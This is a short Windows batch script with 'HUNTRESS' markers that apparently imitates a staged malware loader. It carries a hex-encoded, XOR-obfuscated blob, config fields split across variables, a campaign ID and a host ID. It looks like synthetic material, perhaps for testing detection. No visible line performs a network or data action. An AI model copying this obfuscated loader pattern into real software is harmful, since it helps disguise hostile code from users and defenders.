@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:hex_pairs|reverse_xor

rem HUNTRESS-MATERIAL:51525107020b015504021e47405c5b0e575a6c47405c5b4f51525107020b015504021e5d545a52435e52500e575a6c5d545a52435e52504f565d5c5d0e56545246545d525f6c474b565d4f4152565d5a5f0e5b435241544f020e475d465c506c56545247404f5f5f52500e415647435257524f5d5c5a47524146545a555d5c506c5d41464756411f5d5c5a47524146545a555d5c506c56575c5056570e40435647404f020e45

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set h0=v=1^|steps=decode_configuration,return_conf
set h1=iguration^|adapter=call^|stage_count=1^|graph
set h2==linear^|next_language=none^|campaign_id=cam
set h3=paign-17f2814bab^|host_id=host-17f2814bab

goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE

set "neutral_environment_probe=da0d79a3"

set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg=%h0%%h1%%h2%%h3%"

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo set HUNTRESS_HOST=host-17f2814bab

exit /b 0

